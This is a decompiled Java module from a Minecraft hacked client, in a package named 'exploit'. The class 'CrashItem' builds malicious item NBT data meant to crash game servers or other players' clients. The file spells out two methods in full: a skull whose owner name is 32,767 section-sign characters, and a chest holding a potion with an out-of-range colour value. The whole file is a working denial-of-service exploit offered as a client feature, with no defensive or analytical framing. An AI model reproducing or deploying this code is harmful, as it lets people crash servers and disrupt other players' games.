//Deobfuscated with https://github.com/PetoPetko/Minecraft-Deobfuscator3000 using mappings "1.12 stable mappings"!

// 
// Decompiled by Procyon v0.5.36
// 

package dev.nuker.pyro.deobfuscated.module.exploit;

import net.minecraft.init.Items;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.block.Block;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Blocks;
import dev.nuker.pyro.deobfuscated.events.bus.EventHandler;
import net.minecraftforge.event.entity.EntityJoinWorldEvent;
import dev.nuker.pyro.deobfuscated.events.bus.Listener;
import dev.nuker.pyro.deobfuscated.module.Value;
import dev.nuker.pyro.deobfuscated.module.Module;

public class CrashItem extends Module
{
    public final Value<String> Mode;
    private static String funkyString;
    @EventHandler
    private Listener<EntityJoinWorldEvent> OnWorldEvent;
    
    public CrashItem() {
        super("CrashItem", new String[] { "CrashItem" }, "Gives crash-y items", "NONE", 14379044, ModuleType.EXPLOIT);
        this.Mode = new Value<String>("Mode", new String[] { "M" }, "Mode of method for server crash", "Skull");
        this.OnWorldEvent = new Listener<EntityJoinWorldEvent>(p_Event -> {
            if (p_Event.getEntity() == this.mc.player) {
                this.toggle();
            }
            return;
        });
        this.Mode.addString("Skull");
        this.Mode.addString("Potion");
    }
    
    @Override
    public void onEnable() {
        this.toggle();
        if (!this.mc.player.capabilities.isCreativeMode) {
            this.SendMessage("You must be in creative mode!");
            return;
        }
        final String s = this.Mode.getValue();
        switch (s) {
            case "Potion": {
                final ItemStack chestStack = new ItemStack((Block)Blocks.CHEST);
                final NBTTagCompound chestTag = new NBTTagCompound();
                final NBTTagCompound blockEntityTag = new NBTTagCompound();
                final NBTTagList chestItems = new NBTTagList();
                final NBTTagCompound chestItemTag = new NBTTagCompound();
                chestItemTag.setInteger("CustomPotionColor", Integer.MIN_VALUE);
                final NBTTagCompound chestItemCompound = new NBTTagCompound();
                chestItemCompound.setTag("tag", (NBTBase)chestItemTag);
                chestItemCompound.setByte("Count", (byte)1);
                chestItemCompound.setShort("Damage", (short)0);
                chestItemCompound.setString("id", "minecraft:potion");
                chestItemCompound.setByte("Slot", (byte)0);
                chestItems.appendTag((NBTBase)chestItemCompound);
                blockEntityTag.setTag("Items", (NBTBase)chestItems);
                blockEntityTag.setString("id", "minecraft:chest");
                blockEntityTag.setString("Lock", "");
                chestTag.setTag("BlockEntityTag", (NBTBase)blockEntityTag);
                chestStack.setTagCompound(chestTag);
                chestStack.setStackDisplayName("§cBox of misfits");
                this.mc.player.inventory.armorInventory.set(0, (Object)chestStack);
                break;
            }
            case "Skull": {
                final ItemStack skullStack = new ItemStack(Items.SKULL);
                skullStack.setItemDamage(3);
                final NBTTagCompound tagCompound = new NBTTagCompound();
                final NBTTagCompound skullOwner = new NBTTagCompound();
                skullOwner.setString("Name", CrashItem.funkyString);
                tagCompound.setTag("SkullOwner", (NBTBase)skullOwner);
                skullStack.setTagCompound(tagCompound);
                this.mc.player.inventory.armorInventory.set(0, (Object)skullStack);
                break;
            }
        }
    }
    
    static {
        CrashItem.funkyString = "";
        for (int i = 0; i < 32767; ++i) {
            CrashItem.funkyString = CrashItem.funkyString.concat("§");
        }
    }
}
